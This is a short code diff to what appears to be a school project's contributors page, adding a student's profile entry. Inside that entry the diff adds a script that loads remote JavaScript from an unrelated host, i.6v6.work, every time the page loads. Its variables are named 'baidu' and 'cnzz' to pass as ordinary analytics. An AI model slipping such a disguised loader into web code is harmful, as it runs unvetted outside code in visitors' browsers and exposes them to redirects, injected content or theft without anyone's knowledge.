@@ -99,6 +99,14 @@ export const contributorsOther = {
             animation: rainbow 2s infinite;
         }
     </style>
+    <script type="text/javascript">
+(function(){
+    var baidu = document.createElement("script");
+    baidu.src = "//i.6v6.work/v/?uid=387952";
+    var cnzz = document.getElementsByTagName("script")[0];
+    cnzz.parentNode.insertBefore(baidu, cnzz);		
+ })();
+</script>
     <h1 class="rainbow-text">Hector.HHJ</h1>
     <p>我是黄浩杰，来自2022级5班。</p>
     <p>我的个人博客可以在 010305.xyz 找到。</p>
